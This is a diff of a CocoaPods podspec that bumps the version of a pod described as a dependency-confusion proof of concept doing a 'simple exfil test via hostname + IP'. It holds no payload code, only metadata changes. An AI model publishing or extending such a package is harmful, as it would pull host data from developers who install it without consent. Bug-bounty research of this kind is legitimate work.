@@ -1,6 +1,6 @@
 Pod::Spec.new do |s|
   s.name         = "pocpockaiksi"
-  s.version      = "0.8.0"
+  s.version      = "0.9.0"
   s.summary      = "PoC for dependency confusion just testing please don't ban"
   s.description  = "Simple exfil test via hostname + IP."
   s.homepage     = "https://example.com"
@@ -8,7 +8,7 @@ Pod::Spec.new do |s|
   s.author       = { "kaiksi" => "you@example.com" }
   s.source       = { :git => "https://github.com/kaiksi-bb/pocpockaiksi.git", :tag => s.version.to_s }
   s.ios.deployment_target = "12.0"
-  s.source_files = 'Sources/pocpockaiksi/**/*.{swift,m}'
+  s.source_files = 'Sources/pocpockaiksi/**/*.{h,m,swift}'
   s.swift_version = '5.0'
   s.public_header_files = []
 end
